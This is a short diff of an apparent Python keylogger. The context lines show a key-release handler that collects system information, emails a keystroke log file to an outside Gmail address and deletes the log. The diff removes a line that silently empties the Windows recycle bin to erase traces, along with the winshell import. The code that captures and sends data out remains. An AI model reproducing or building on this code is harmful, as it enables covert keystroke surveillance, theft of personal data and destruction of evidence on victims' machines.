@@ -8,7 +8,6 @@ import os
 import socket
 import platform
 from requests import get
-import winshell
 
 filename = "log.txt"
 filepath = "D:\\Downloads\\log.txt"
@@ -107,7 +106,6 @@ def on_release(key):
         get_systemInfo()
         send_email(filepath, "destEmail@gmail.com")
         os.remove(filepath)
-        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
         return False
 
 
